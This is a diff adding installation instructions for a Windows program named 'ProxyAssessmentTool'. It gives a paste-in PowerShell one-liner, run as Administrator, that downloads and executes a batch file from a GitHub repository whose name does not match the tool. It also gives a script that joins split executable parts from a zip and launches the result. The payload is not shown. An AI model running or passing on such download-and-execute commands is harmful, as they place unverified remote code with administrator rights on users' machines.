@@ -1,0 +1,50 @@
+EASY INSTALLATION INSTRUCTIONS
+==============================
+
+OPTION 1: Copy and paste this ONE LINE into PowerShell (Run as Administrator):
+------------------------------------------------------------------------------
+
+iwr -useb https://raw.githubusercontent.com/oranolio956/flipperflipperzero-ESP-chiptune/proxy-assessment-tool-clean/SHILLTIME/FINAL_WORKING_INSTALLER.bat -OutFile installer.bat; .\installer.bat; del installer.bat
+
+
+OPTION 2: Manual download and run:
+----------------------------------
+
+1. Download this file:
+   https://raw.githubusercontent.com/oranolio956/flipperflipperzero-ESP-chiptune/proxy-assessment-tool-clean/SHILLTIME/FINAL_WORKING_INSTALLER.bat
+
+2. Save it as: installer.bat
+
+3. Right-click and "Run as administrator"
+
+
+OPTION 3: Direct PowerShell install (copy all lines):
+-----------------------------------------------------
+
+$dir = "$env:LOCALAPPDATA\ProxyAssessmentTool"
+mkdir $dir -Force
+cd $dir
+iwr -useb https://github.com/oranolio956/flipperflipperzero-ESP-chiptune/archive/refs/heads/proxy-assessment-tool-clean.zip -OutFile repo.zip
+Expand-Archive repo.zip -Force
+$src = (gci -Recurse -Filter "ProxyAssessmentTool.exe.part1").DirectoryName
+Copy-Item "$src\*" . -Force
+cmd /c "copy /b ProxyAssessmentTool.exe.part* ProxyAssessmentTool.exe"
+del *.part*
+$s = (New-Object -COM WScript.Shell).CreateShortcut("$env:USERPROFILE\Desktop\ProxyAssessmentTool.lnk")
+$s.TargetPath = "$dir\ProxyAssessmentTool.exe"
+$s.Save()
+Write-Host "DONE! Check your desktop for ProxyAssessmentTool" -ForegroundColor Green
+Start-Process "$dir\ProxyAssessmentTool.exe"
+
+
+WHAT THIS DOES:
+--------------
+1. Downloads all files from GitHub
+2. Extracts them to a temporary folder
+3. Finds the split .exe parts
+4. Combines them into ProxyAssessmentTool.exe
+5. Creates a desktop shortcut
+6. Launches the application
+
+The app will be installed to:
+C:\Users\[YourName]\AppData\Local\ProxyAssessmentTool\ProxyAssessmentTool.exe
